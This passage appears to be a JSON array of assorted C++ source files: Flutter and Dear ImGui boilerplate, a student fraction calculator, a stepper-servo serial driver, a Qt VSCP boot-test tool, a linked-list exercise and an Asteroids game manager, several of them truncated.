window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// dear imgui: Platform Backend for SDL2\n// This needs to be used along with a Renderer (e.g. DirectX11, OpenGL3, Vulkan..)\n// (Info: SDL2 is a cross-platform general purpose library for handling windows, inputs, graphics context creation, etc.)\n// (Prefer SDL 2.0.5+ for full feature support.)\n\n// Implemented features:\n//  [X] Platform: Clipboard support.\n//  [X] Platform: Mouse support. Can discriminate Mouse/TouchScreen.\n//  [X] Platform: Keyboard support. Since 1.87 we are using the io.AddKeyEvent() function. Pass ImGuiKey values to all key functions e.g. ImGui::IsKeyPressed(ImGuiKey_Space). [Legacy SDL_SCANCODE_* values will also be supported unless IMGUI_DISABLE_OBSOLETE_KEYIO is set]\n//  [X] Platform: Gamepad support. Enabled with 'io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad'.\n//  [X] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange'.\n//  [X] Platform: Basic IME support. App needs to call 'SDL_SetHint(SDL_HINT_IME_SHOW_UI, \"1\");' before SDL_CreateWindow()!.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2024-02-14: Inputs: Handle gamepad disconnection. Added ImGui_ImplSDL2_SetGamepadMode().\n//  2023-10-05: Inputs: Added support for extra ImGuiKey values: F13 to F24 function keys, app back/forward keys.\n//  2023-04-06: Inputs: Avoid calling SDL_StartTextInput()/SDL_StopTextInput() as they don't only pertain to IME. It's unclear exactly what their relation is to IME. (#6306)\n//  2023-04-04: Inputs: Added support for io.AddMouseSourceEvent() to discriminate ImGuiMouseSource_Mouse/ImGuiMouseSource_TouchScreen. (#2702)\n//  2023-02-23: Accept SDL_GetPerformanceCounter() not returning a monotonically increasing value. (#6189, #6114, #3644)\n//  2023-02-07: Implement IME handler (io.SetPlatformImeDataFn will call SDL_SetTextInputRect()/SDL_StartTextInput()).\n//  2023-02-07: *BREAKING CHANGE* Renamed this backend file from imgui_impl_sdl.cpp/.h to imgui_impl_sdl2.cpp/.h in prevision for the future release of SDL3.\n//  2023-02-02: Avoid calling SDL_SetCursor() when cursor has not changed, as the function is surprisingly costly on Mac with latest SDL (may be fixed in next SDL version).\n//  2023-02-02: Added support for SDL 2.0.18+ preciseX/preciseY mouse wheel data for smooth scrolling + Scaling X value on Emscripten (bug?). (#4019, #6096)\n//  2023-02-02: Removed SDL_MOUSEWHEEL value clamping, as values seem correct in latest Emscripten. (#4019)\n//  2023-02-01: Flipping SDL_MOUSEWHEEL 'wheel.x' value to match other backends and offer consistent horizontal scrolling direction. (#4019, #6096, #1463)\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2022-09-26: Inputs: Disable SDL 2.0.22 new \"auto capture\" (SDL_HINT_MOUSE_AUTO_CAPTURE) which prevents drag and drop across windows for multi-viewport support + don't capture when drag and dropping. (#5710)\n//  2022-09-26: Inputs: Renamed ImGuiKey_ModXXX introduced in 1.87 to ImGuiMod_XXX (old names still supported).\n//  2022-03-22: Inputs: Fix mouse position issues when dragging outside of boundaries. SDL_CaptureMouse() erroneously still gives out LEAVE events when hovering OS decorations.\n//  2022-03-22: Inputs: Added support for extra mouse buttons (SDL_BUTTON_X1/SDL_BUTTON_X2).\n//  2022-02-04: Added SDL_Renderer* parameter to ImGui_ImplSDL2_InitForSDLRenderer(), so we can use SDL_GetRendererOutputSize() instead of SDL_GL_GetDrawableSize() when bound to a SDL_Renderer.\n//  2022-01-26: Inputs: replaced short-lived io.AddKeyModsEvent() (added two weeks ago) with io.AddKeyEvent() using ImGuiKey_ModXXX flags. Sorry for the confusion.\n//  2021-01-20: Inputs: calling new io.AddKeyAnalogEvent() for gamepad support, instead of writing directly to io.NavInputs[].\n//  2022-01-17: Inputs: calling new io.AddMousePosEvent(), io.AddMouseButtonEvent(), io.AddMouseWheelEvent() API (1.87+).\n//  2022-01-17: Inputs: always update key mods next and before key event (not in NewFrame) to fix input queue with very low framerates.\n//  2022-01-12: Update mouse inputs using SDL_MOUSEMOTION/SDL_WINDOWEVENT_LEAVE + fallback to provide it when focused but not hovered/captured. More standard and will allow us to pass it to future input queue API.\n//  2022-01-12: Maintain our own copy of MouseButtonsDown mask instead of using ImGui::IsAnyMouseDown() which will be obsoleted.\n//  2022-01-10: Inputs: calling new io.",
    "////program name : FCAI-Cairo University Fraction Calculator\n// Program Description: Calculator that is able to add, subtract, multiply and divide fractions\n\n// Author1 and ID and Group: Youssef Amgad Abd Al Halim Ahmed, Testing and regex pattern\n\n// Author2 and ID and Group: Mohamed Ahmed Mohamed Abd El_wahab, Mathematical Calculations\n\n// Author3 and ID and Group: Amr Khaled Ahmed Abd ElHamid, divided the regex pattern into three parts(operator, fraction 1 , fraction 2), created if statement for the mathematical calculations\n\n\n#include <iostream>\n#include <regex>\n# include <cctype>\n# include <string>\n# include <cstring>\n# include <algorithm>\n# include <vector>\n\nusing namespace std;\n\nbool is_valid(string format);\nstring operation(string equation);\npair<long long, long long> extract_fraction(string temp_fraction);\nstring addition_fraction(long long num_fraction1,long long deno_fraction1,long long num_fraction2,long long deno_fraction2);\nstring subtraction_fraction(long long num_fraction1,long long deno_fraction1,long long num_fraction2,long long deno_fraction2);\nstring multiplcation_fraction(long long num_fraction1,long long deno_fraction1,long long num_fraction2,long long deno_fraction2);\nstring division_fraction(long long num_fraction1,long long deno_fraction1,long long num_fraction2,long long deno_fraction2);\npair<long long,long long> common_divisor(long long numerator,long long denominator);\n\n\nint main() {\n\n    cout << \"Welcome to our fractional calculator\" << endl;\n\n    while(true){\n        string format;\n        string choice;\n\n        // display menu and take input from user and take choice from user\n        cout << \"1. Enter an input\" << endl;\n        cout << \"2. Exit\" << endl;\n        cout << \"Choose 1 or 2\" << endl;\n        cin >> choice;\n\n        // validate choice\n        while (true) {\n            if (choice == \"1\")break;\n            else if (choice == \"2\") {\n                cout << \"Thanks for using our fractional calculator\" << endl;\n                return 0;\n            } else {\n                cout << \"Invalid input, please enter a valid choice\" << endl;\n                cin >> choice;\n            }\n        }\n\n        // get calculation from user\n        cin.ignore();\n        cout << \"Please enter your calculation\" << endl;\n        getline(cin, format);\n\n        // make sure format isn't empty\n        while (format.empty()) {\n            cout << \"Invalid input\" << endl;\n            cout << \"Enter a valid input format\" << endl;\n            getline(cin, format);\n        }\n\n        // make sure format matches calculation format\n        bool is_valid_format = is_valid(format);\n\n        while (!is_valid_format) {\n            cout << \"Invalid input\" << endl;\n            cout << \"Enter a valid input format\"<<endl;;\n            getline(cin, format);\n            is_valid_format = is_valid(format);\n        }\n        operation(format);\n    }\n\n}\n\n\nstring operation(string equation) {\n    double result_D;\n    regex N(\"-\");\n    regex Multi(\"\\\\\"); // Escaping '' since it's a special character in regex\n    regex Divide (\"/\");\n    smatch matches;\n\n    // here I will define the equation form divided into parts then take every part as (fraction_1, operation, fraction_2) the perform the equation\n    regex equation_form(\"[ ]?([+-]?[0-9]+(?:/[0]?+[1-9][0-9])?)\\\\s([-+/])\\\\s([+-]?[0-9]+(?:/[0]?+[1-9][0-9])?)[ ]*?\");\n    regex_match(equation, matches, equation_form);\n    string fraction_1 = matches[1].str();\n    string operation = matches[2].str();\n    string fraction_2 = matches[3].str();\n    // by operation choose the operation\n\n    pair<long long, long long> fraction = extract_fraction(fraction_1);\n    pair<long long, long long> fraction2 = extract_fraction(fraction_2);\n\n    if (operation == \"+\"){\n        cout << \"Addition\" << endl;\n        addition_fraction(fraction.first,fraction.second,fraction2.first,fraction2.second);\n\n    }\n    else if (operation == \"-\"){\n        cout << \"Subtraction\" << endl;\n        subtraction_fraction(fraction.first,fraction.second,fraction2.first,fraction2.second);\n\n    }\n    else if (operation == \"/\"){\n        cout << \"Divide\" << endl;\n        division_fraction(fraction.first,fraction.second,fraction2.first,fraction2.second);\n\n    }\n    else if (operation == \"*\"){\n        cout << \"multiplies\" << endl;\n        multiplcation_fraction(fraction.first,fraction.second,fraction2.first,fraction2.second);\n\n    }\n\n    // Return some value since the function is declared to return a string\n    return \"Operation performed successfully\";\n}\n\n\n// function that checks if the format the user entered is correct and valid\nbool is_valid(string format) {\n    if (regex_match(format, regex(\"[ ]?[+-]?[0-9]+(?:/[0]?+[1-9][0-9])?\\\\s[-/+]\\\\s[+-]?[0-9]+(?:/[0]?+[1-9][0-9])?[ ]*?\"))) {\n        return true;\n    } else {\n        return false;\n    }\n}\n\n\npair<long long, long long> extract_fraction(string temp_fraction) {\n    long long sign = 1;\n    string fraction = temp_fraction;\n    if (fraction[0] == '-') {\n        ",
    "#include \"MksServo42c.h\"\r\n\r\nMKSServoDriver::MKSServoDriver() \r\n{\r\n  servoSerial = nullptr;\r\n}\r\n\r\nvoid MKSServoDriver::init(uint8_t RX, uint8_t TX, long const baudRate, uint8_t servoAddress) \r\n{\r\n    servoSerial = new EspSoftwareSerial::UART(RX, TX);\r\n    servoSerial->begin(baudRate);\r\n    rxCnt=0;\r\n    MStep = 0x08;\r\n    stepSize = 1.8;\r\n    servoAddress = 0xE0 + servoAddress;\r\n    txBuffer[0] = servoAddress;\r\n}\r\n\r\nfloat MKSServoDriver::sendServoSignal(command order)\r\n{\r\n  length = 3;\r\n  if(order == readEncoder){\r\n    txBuffer[1] = 0x30;\r\n    length = 8;\r\n  }\r\n  else if(order == readPulses){\r\n    txBuffer[1] = 0x33;\r\n    length = 6;\r\n  }\r\n  else if(order == readAngle){\r\n    txBuffer[1] = 0x36;\r\n    length =  6;\r\n  }\r\n  else if(order == readErrorAngle){\r\n    txBuffer[1] = 0x39;\r\n    length = 4;\r\n  }\r\n  else if(order == readEnableStatus){\r\n    txBuffer[1] = 0x3a;\r\n  }\r\n  else if(order == readShaftStatus){\r\n    txBuffer[1] = 0x3e;\r\n  }\r\n  else {\r\n    error();\r\n    return 0;\r\n  }\r\n  txBuffer[2] = getCheckSum(txBuffer,2);\r\n  servoSerial->write(txBuffer,3);\r\n  ack(length,order);\r\n  if(order!=readEnableStatus || order!=readShaftStatus)\r\n    return modValue;\r\n  return 0;\r\n}\r\nvoid MKSServoDriver::sendServoSignal(command order, uint8_t mode)\r\n{\r\n  length = 4;\r\n  if(order == sendCalibrate){\r\n    txBuffer[1] = 0x80;\r\n  }\r\n  else if(order == sendMotorType){\r\n    txBuffer[1] = 0x81;\r\n    stepSize = (mode*0.9) + 0.9;\r\n    MKSServoDriver::setConstants();\r\n  }\r\n  else if(order == sendControlMode){\r\n    txBuffer[1] = 0x82;\r\n  }\r\n  else if(order == sendOperatingCurrent){\r\n    txBuffer[1] = 0x83;\r\n  }\r\n  else if(order == sendStepSize){\r\n    txBuffer[1] = 0x84;\r\n    MStep = mode;\r\n    MKSServoDriver::setConstants();\r\n  }\r\n  else if(order == sendEnableType){\r\n    txBuffer[1] = 0x85;\r\n  }\r\n  else if(order == sendMotorDirection){\r\n    txBuffer[1] = 0x86;\r\n  }\r\n  else if(order == sendAutoScreenOff){\r\n    txBuffer[1] = 0x87;\r\n  }\r\n  else if(order == sendStallProtection){\r\n    txBuffer[1] = 0x88;\r\n  }\r\n  else if(order == sendInternalSubdivision){\r\n    txBuffer[1] = 0x89;\r\n  }\r\n  else if(order == sendUartBaud){\r\n    txBuffer[1] = 0x8a;\r\n  }\r\n  else if(order == sendUartAddress){\r\n    txBuffer[1] = 0x8b;\r\n  }\r\n  else if(order == sendZeroMode){\r\n    txBuffer[1] = 0x90;\r\n  }\r\n  else if(order == sendZeroPoint){\r\n    txBuffer[1] = 0x91;\r\n  }\r\n  else if(order == sendZeroSpeed){\r\n    txBuffer[1] = 0x92;\r\n  }\r\n  else if(order == sendZeroDirection){\r\n    txBuffer[1] = 0x93;\r\n  }\r\n  else if(order == moveZeroPoint){\r\n    txBuffer[1] = 0x94;\r\n  }\r\n  else {\r\n    error();\r\n    return ;\r\n  }\r\n  txBuffer[2] = mode;\r\n  txBuffer[3] = getCheckSum(txBuffer,3);\r\n  if(order!=sendCalibrate)\r\n    servoSerial->write(txBuffer,4);\r\n  else\r\n  {\r\n    servoSerial->write(txBuffer,4);\r\n    delay(50000);\r\n  }\r\n  length = 3;\r\n  ack(length,order);\r\n}\r\n\r\n//Default values: Kp:0x650, Ki:0x1, Kd: 0x650, Acc: 0x11e, MaxT: 0x4B0 (max)\r\nvoid MKSServoDriver::setParameters(command order, uint16_t param)\r\n{\r\n  if(order == setKp){\r\n    txBuffer[1] = 0xA1;\r\n  }\r\n  else if(order == setKi){\r\n    txBuffer[1] = 0xA2;\r\n  }\r\n  else if(order == setKd){\r\n    txBuffer[1] = 0xA3;\r\n  }\r\n  else if(order == setAcc){\r\n    txBuffer[1] = 0xA4;\r\n  }\r\n  else if(order == setMaxTo){\r\n    txBuffer[1] = 0xA5;\r\n    param = static_cast<uint16_t>(percentageToRange(param,0x0000,0x04B0));\r\n  }\r\n  else {\r\n    error();\r\n    return ;\r\n  }\r\n  txBuffer[2] = (param >> 8) & 0xFF;\r\n  txBuffer[3] = param & 0xFF;\r\n  txBuffer[4] = getCheckSum(txBuffer,4);\r\n  servoSerial->write(txBuffer,5);\r\n  ack(length,order);\r\n}\r\n\r\nvoid MKSServoDriver::constantControl(command order, float value, bool direction)\r\n{\r\n  length=4;\r\n  if(order == setEnable){\r\n    txBuffer[1] = 0xF3;\r\n  }\r\n  else if(order == runConstSpeed){\r\n    txBuffer[1] = 0xF6;\r\n    value = static_cast<uint8_t>((direction << 7) | percentageToRange(value, 0x00, 0x7F));\r\n  }\r\n  else if(order == stopMotor){\r\n    txBuffer[1] = 0xF7;\r\n    txBuffer[2] = getCheckSum(txBuffer,2);\r\n    servoSerial->write(txBuffer,3);\r\n    length = 3;\r\n    ack(length,order);\r\n    return ;\r\n  }\r\n  else if(order == saveOrClearStatus){\r\n    txBuffer[1] = 0xFF;\r\n  }\r\n  else {\r\n    error();\r\n    return ;\r\n  }\r\n  txBuffer[2] = value;\r\n  txBuffer[3] = getCheckSum(txBuffer,3);\r\n  servoSerial->write(txBuffer,4);\r\n  length=3;\r\n  ack(length,order);\r\n}\r\n\r\nvoid MKSServoDriver::variableControl(uint64_t mode)\r\n{\r\n  txBuffer[1] = 0xFD;\r\n  txBuffer[2] = (mode >> 32) & 0xFF;\r\n  txBuffer[3] = (mode >> 24) & 0xFF;\r\n  txBuffer[4] = (mode >> 16) & 0xFF;\r\n  txBuffer[5] = (mode >> 8) & 0xFF;\r\n  txBuffer[6] = mode & 0xFF;\r\n  txBuffer[7] = getCheckSum(txBuffer,7);\r\n  length = 3;\r\n  servoSerial->write(txBuffer,8);\r\n  command order = varControl;\r\n  ack(length,order);\r\n}\r\n\r\nuint8_t MKSServoDriver::getCheckSum(uint8_t *buffer,uint8_t size)\r\n{\r\n  uint8_t i;\r\n  uint16_t sum=0;\r\n  for(i=0;i<size;i++)\r\n    {\r\n      sum += buffer[i];\r\n    }\r\n  return(sum&0xFF);\r\n}\r\n\r\nvoid MKSServoDriver::ack(uint8_t len , command order)\r\n{\r\n  boo",
    "#include \"btest.h\"\n#include \"mainwindow.h\"\n#include <QApplication>\n#include <QCommandLineParser>\n#include <QStandardPaths>\n\n#include <iostream>\n\n#include <spdlog/async.h>\n#include <spdlog/sinks/rotating_file_sink.h>\n#include <spdlog/sinks/stdout_color_sinks.h>\n#include <spdlog/spdlog.h>\n\n#include <nlohmann/json.hpp>\n\n// for convenience\nusing json = nlohmann::json;\nusing namespace kainjow::mustache;\n\nint\nmain(int argc, char* argv[])\n{\n  int rv;\n  btest app(argc, argv);\n  QApplication::setApplicationName(\"btest\");\n  QApplication::setApplicationVersion(\"0.1\");\n\n  // Load configuration file\n  app.loadProgramSettings();\n\n  QCommandLineParser parser;\n  parser.setApplicationDescription(\"VSCP Boot Test helper\");\n  parser.addHelpOption();\n  parser.addVersionOption();\n\n  // --------------------------------------------------------------------------\n\n  // interface (-i, --interface)\n  QCommandLineOption interfaceOption(\n    QStringList() << \"i\"\n                  << \"interface\",\n    QApplication::translate(\"main\", \"Client interface to use\"),\n    \"interface (socketcan, canal, tcpip, udp, multicast, mqtt, ws1, ws2)\",\n    \"socketcan\");\n  parser.addOption(interfaceOption);\n\n  // config (-b, --bootmode)\n  QCommandLineOption bootOption(\n    QStringList() << \"b\"\n                  << \"bootmode\",\n    QApplication::translate(\"main\", \"Start bootloader (non zero, typical 0xff) or application firmware (0)\"),\n    \"mode\",\n    \"0xff\");\n  parser.addOption(bootOption);\n\n  // config (-B, --block)\n  QCommandLineOption blockOption(\n    QStringList() << \"B\"\n                  << \"block\"\n                  << \"blocksize\",\n    QApplication::translate(\"main\", \"Block info on the form 'size:count' where size is he size \"\n                                    \"of a block in bytes and count are the number of blocks of that size.\"),\n    \"blck:cnt\",\n    \"\");\n  parser.addOption(blockOption);\n\n  // config (-c, --config)\n  QCommandLineOption configOption(\n    QStringList() << \"c\"\n                  << \"config\",\n    QApplication::translate(\"main\", \"Configuration string for interface (see docs for interface)\"),\n    \"cfg1;cfg2;cfg2;...\",\n    \"vcan0\");\n  parser.addOption(configOption);\n\n  // GUID (-g, --guid)\n  QCommandLineOption guidOption(\n    QStringList() << \"g\"\n                  << \"guid\",\n    QApplication::translate(\"main\", \"GUID to use for this client\"),\n    \"guid\",\n    \"00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\");\n  parser.addOption(guidOption);\n\n  // host (-h, --host)\n  QCommandLineOption hostOption(\n    QStringList() << \"s\"\n                  << \"srv\"\n                  << \"host\"\n                  << \"server\",\n    QApplication::translate(\"main\", \"Server/Host to connect to\"),\n    \"host\",\n    \"localhost\");\n  parser.addOption(hostOption);\n\n  // port (-p, --port)\n  QCommandLineOption portOption(\n    QStringList() << \"p\"\n                  << \"port\"\n                  << \"remote-port\",\n    QApplication::translate(\"main\", \"Port to connect to\"),\n    \"port\",\n    \"9598\");\n  parser.addOption(portOption);\n\n  // timeout (-t, --timeout)\n  QCommandLineOption timeoutOption(QStringList() << \"t\"\n                                                 << \"timeout\",\n                                   QApplication::translate(\"main\", \"Timeout in milliseconds for communiction\"),\n                                   \"ms\",\n                                   \"1000\");\n  parser.addOption(timeoutOption);\n\n  // user (-u, --user)\n  QCommandLineOption userOption(QStringList() << \"u\"\n                                              << \"user\",\n                                QApplication::translate(\"main\", \"Username\"),\n                                \"user\",\n                                \"vscp\");\n  parser.addOption(userOption);\n\n  // password (-p, --password)\n  QCommandLineOption passwordOption(QStringList() << \"P\"\n                                                  << \"password\",\n                                    QApplication::translate(\"main\", \"Password\"),\n                                    \"password\",\n                                    \"secret\");\n  parser.addOption(passwordOption);\n\n  // VSCP level (-l, --level)\n  QCommandLineOption levelOption(QStringList() << \"l\"\n                                               << \"vscplevel\",\n                                 QApplication::translate(\"main\", \"VSCP protocol level\"),\n                                 \"(0|1)\",\n                                 \"0\");\n  parser.addOption(levelOption);\n\n  // Configuration file\n  QCommandLineOption fileOption(QStringList() << \"f\"\n                                              << \"cfgfile\",\n                                QApplication::translate(\"main\", \"Configuration file path\"),\n                                \"path\",\n                                \"\");\n  parser.addOption(fileOption);\n\n  // --------------------------------------------------------------------------\n\n  //////////////////////////////////////////////////////////////////////////////\n  //                                spdlog\n  /////////////////////////",
    "#include <iostream>\r\n#include <stdlib.h>\r\nusing namespace std;\r\n\r\nstruct node\r\n{\r\n    node *temp, *next, *new_node;\r\n    string name;\r\n    int age, mob_no;\r\n    long long int donation_amt;\r\n} a[10];\r\n\r\nnode *get_node()\r\n{\r\n    node *temp;\r\n    temp = new node;\r\n    temp = temp->next;\r\n    return temp;\r\n}\r\n\r\nnode *create_node()\r\n{\r\n    node *head, *temp, *new_node;\r\n    string ch;\r\n    bool flag = true;\r\n    string name1;\r\n    int age1, mob_no1;\r\n    int donation_amt1;\r\n\r\n    do\r\n    {\r\n        new_node = get_node();\r\n        cout << \"Enter the name of Donor : \";\r\n        cin >> name1;\r\n        cout << endl;\r\n\r\n        cout << \"Enter the Donor age : \";\r\n        cin >> age1;\r\n        cout << endl;\r\n\r\n        cout << \"Enter the Donor mobile number : \";\r\n        cin >> mob_no1;\r\n        cout << endl;\r\n\r\n        cout << \"Enter the Donation amount : \";\r\n        cin >> donation_amt1;\r\n        cout << endl;\r\n\r\n        if (new_node == NULL)\r\n        {\r\n            cout << \"Memory not allocated..\";\r\n        }\r\n        else\r\n        {\r\n            new_node->name = name1;\r\n            new_node->donation_amt = donation_amt1;\r\n            new_node->mob_no = mob_no1;\r\n            new_node->age = age1;\r\n        }\r\n        if (flag == true)\r\n        {\r\n            head = new_node;\r\n            temp = head;\r\n            flag = false;\r\n        }\r\n        else\r\n        {\r\n            temp = temp->next;\r\n            temp = new_node;\r\n        }\r\n        cout << \"Do you want to continue y or n\\n\";\r\n        cin >> ch;\r\n    } while (ch == \"y\");\r\n    cout << \"The singly linklist is created\\n\";\r\n    \r\n    return temp;\r\n}\r\n\r\nvoid display(node *h)\r\n{\r\n    node *temp = h;\r\n    cout << \"-----------------------------------------------------\\n\";\r\n    cout << \"Name\\tAge\\tMobile_no\\tDonation_amount\\n\";\r\n    cout << temp->name << \"\\t\" << temp->age << \"\\t\" << temp->mob_no << \"\\t\" << temp->donation_amt << \"\\n\";\r\n    cout << \"-----------------------------------------------------\\n\";\r\n}\r\n\r\nint main()\r\n{\r\n    node *temp;\r\n    temp = create_node();\r\n    display(temp);\r\n\r\n    return 0;\r\n}",
    "#include \"GameManager.h\"\n#include \"Asteroid.h\"\n#include \"Constants.h\"\n#include \"Player.h\"\n#include <fstream>\n\nstd::vector<Entity*> GameManager::entities;\nstd::list<Entity*> GameManager::entitiesToAdd;\nstd::list<Entity*> GameManager::entitiesToRemove;\n\nsize_t GameManager::score;\nsize_t GameManager::highestScore;\n\nsf::Texture GameManager::backgroundTexture;\nsf::Sprite GameManager::backgroundSprite;\n\nsf::Font GameManager::font;\nsf::Font GameManager::tableFont;\nsf::Text GameManager::scoreText;\nsf::Text GameManager::gameOverText;\nsf::Text GameManager::continueText;\nsf::Text GameManager::highestScoreText;\nsf::Text GameManager::titleText;\nsf::Text GameManager::menuText;\nsf::Text GameManager::playText;\nsf::Text GameManager::namePromptText;\nsf::Text GameManager::nameText;\nsf::Text GameManager::rankingsText;\nsf::Text GameManager::rankingPromptText;\nsf::Text GameManager::funFactText;\nsf::Text GameManager::funFactPromptText;\nsf::Text GameManager::funFactContinueText;\nsf::Text GameManager::funFactMenuText;\nstd::string GameManager::funFact;\nstd::string GameManager::username;\nstd::string GameManager::rankings;\nstd::string GameManager::funFactImageUrl;\nsf::RenderWindow GameManager::funFactWindow;\n\nsf::Texture GameManager::funFactTexture;\nsf::Sprite GameManager::funFactSprite;\n\nsf::SoundBuffer GameManager::shootSoundBuffer;\nsf::Sound GameManager::shootSound;\n\nfloat GameManager::asteroidSpawnTimer;\n\nGameManager::GameState GameManager::gameState;\n\nvoid GameManager::initialize()\n{\n\tstd::ifstream file(\"score.dat\", std::ios::binary | std::ios::in);\n\tif (file.is_open())\n\t{\n\t\tfile.read(reinterpret_cast<char*>(&highestScore), sizeof(size_t));\n\t\tfile.close();\n\t}\n\n\tusername = \"Anonymous\";\n\tstd::ifstream usernameFile(\"username.dat\");\n\tif (usernameFile.is_open())\n\t{\n\t\tstd::getline(usernameFile, username);\n\t\tusernameFile.close();\n\t}\n\n\tif (!backgroundTexture.loadFromFile(\"content/universe.jpg\"))\n\t{\n\t\tthrow std::runtime_error(\"Failed to load universe.jpg\");\n\t}\n\tfloat scaleX = static_cast<float>(SCREEN_WIDTH) / backgroundTexture.getSize().x;\n\tfloat scaleY = static_cast<float>(SCREEN_HEIGHT) / backgroundTexture.getSize().y;\n\tbackgroundSprite.setScale(scaleX, scaleY);\n\tbackgroundSprite.setTexture(backgroundTexture);\n\n\tfont.loadFromFile(\"content/text-font.ttf\");\n\ttableFont.loadFromFile(\"content/table-font.ttf\");\n\tscoreText.setFont(font);\n\tscoreText.setPosition(sf::Vector2f(40, 20));\n\tscoreText.setCharacterSize(48);\n\n\tnamePromptText.setFont(font);\n\tnamePromptText.setPosition(sf::Vector2f(200, 220));\n\tnamePromptText.setCharacterSize(24);\n\tnamePromptText.setString(\"Enter your name:\");\n\n\tnameText.setFont(font);\n\tnameText.setPosition(sf::Vector2f(200, 250));\n\tnameText.setCharacterSize(24);\n\tnameText.setString(username);\n\n\trankingPromptText.setFont(font);\n\trankingPromptText.setPosition(sf::Vector2f(260, 280));\n\trankingPromptText.setCharacterSize(48);\n\trankingPromptText.setString(\"---> Global Rankings <---\");\n\n\trankingsText.setFont(tableFont);\n\trankingsText.setPosition(sf::Vector2f(100, 330));\n\trankingsText.setCharacterSize(32);\n\n\tgameOverText.setFont(font);\n\tgameOverText.setPosition(sf::Vector2f(250, 10));\n\tgameOverText.setCharacterSize(128);\n\tgameOverText.setString(\"Game Over!\");\n\n\tfunFactPromptText.setFont(font);\n\tfunFactPromptText.setPosition(sf::Vector2f(420, 150));\n\tfunFactPromptText.setCharacterSize(36);\n\tfunFactPromptText.setString(\"A Fun Fact!\");\n\n\tfunFactText.setFont(tableFont);\n\tfunFactText.setPosition(sf::Vector2f(90, 180));\n\tfunFactText.setCharacterSize(24);\n\n\tfunFactContinueText.setFont(font);\n\tfunFactContinueText.setCharacterSize(24);\n\tfunFactContinueText.setString(\"Press ENTER to continue\");\n\n\tfunFactMenuText.setFont(font);\n\tfunFactMenuText.setCharacterSize(24);\n\tfunFactMenuText.setString(\"Press ESC to exit to menu\");\n\n\tfunFact = \"\";\n\n\tcontinueText.setFont(font);\n\tcontinueText.setPosition(sf::Vector2f(420, 810));\n\tcontinueText.setCharacterSize(24);\n\tcontinueText.setString(\"Press ENTER to continue\");\n\n\thighestScoreText.setFont(font);\n\thighestScoreText.setPosition(sf::Vector2f(40, 20));\n\thighestScoreText.setCharacterSize(48);\n\thighestScoreText.setString(\"Your Highest Score: \" + std::to_string(highestScore));\n\n\tmenuText.setFont(font);\n\tmenuText.setPosition(sf::Vector2f(420, 850));\n\tmenuText.setCharacterSize(24);\n\tmenuText.setString(\"Press ESC to exit to menu\");\n\n\ttitleText.setFont(font);\n\ttitleText.setPosition(sf::Vector2f(270, 100));\n\ttitleText.setCharacterSize(100);\n\ttitleText.setString(\"ASTEROIDS\");\n\n\tplayText.setFont(font);\n\tplayText.setPosition(sf::Vector2f(450, 780));\n\tplayText.setCharacterSize(24);\n\tplayText.setString(\"Press ENTER to play!\");\n\n\tshootSoundBuffer.loadFromFile(\"content/shoot.wav\");\n\tshootSound.setBuffer(shootSoundBuffer);\n\n\tgetRankings();\n\tgameState = GameState::Menu;\n}\n\nvoid GameManager::saveUsername()\n{\n\tstd::ofstream usernameFile(\"username.dat\");\n\tif (usernameFile.is_open())\n\t{\n\t\tusernameFile << username;\n\t\tusernameFile.close();\n\t}\n}\n\nvoid GameManager::startGame()\n{\n\tgameState = GameState::Playing;\n\tentities.clea",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"notes\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
